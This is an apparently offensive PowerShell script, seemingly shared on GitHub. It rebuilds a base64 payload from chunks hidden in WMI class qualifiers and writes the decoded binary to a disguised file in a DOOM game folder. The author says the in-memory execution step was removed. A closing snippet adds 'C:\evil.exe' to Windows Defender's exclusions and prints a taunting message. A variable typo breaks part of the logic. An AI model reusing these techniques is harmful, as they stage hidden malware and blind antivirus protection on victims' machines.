Note to self: UTF16E for encoding commands

$path = "C:\GOG Games\DOOM\unins002.dat"

$class = "WMIFSTest"
$property = "Filestore"

$class = Get-CimClass -ClassName $class
$property = $class.CimClassProperties | Where-Object { $_.Name -eq $proprety }
$qualifiers = $property.Qualifiers
$sq = $qualifiers | Sort-Object -Property { [int]$_.Name.Substring(3) }

$encoding = [System.Text.Encoding]::UTF8
Remove-Item $path -Force
$file = [System.IO.File]::Open($path, [System.IO.FileMode]::Append)

foreach ($qualifier in $sq) {
	try
	{
		if($qualifier.Name -like "key*")
		{
			$string = $qualifier.Value
			$bytes = $encoding.GetBytes($string)
			$file.Write($bytes, 0, $bytes.Length)
		}
	} catch {}
}
$file.Close()
$file.Dispose()
# Step 2: Read the file back into a string
$base64String = Get-Content -Path $path -Encoding UTF8

# Step 3: Convert the base64 string back to binary
$binary = new-object byte[] 0
$binary = [byte[]][System.Convert]::FromBase64String($base64String)

############################################
# Section for writing to memory was removed, not trying to
# put a fully functional version on github.
############################################

# Step 4: Write to file
Remove-Item $path -Force
[System.IO.File]::WriteAllBytes($path, $binary)









; Defender
Add-MpPreference -ExclusionPath C:\evil.exe;
$check = Get-MpPreference | Select -Property ExclusionPath;
if($check.ExclusionPath -match '.*evil.*') {
Write-Host Ha ha ha added "C:\evil.exe" to exclusions
}

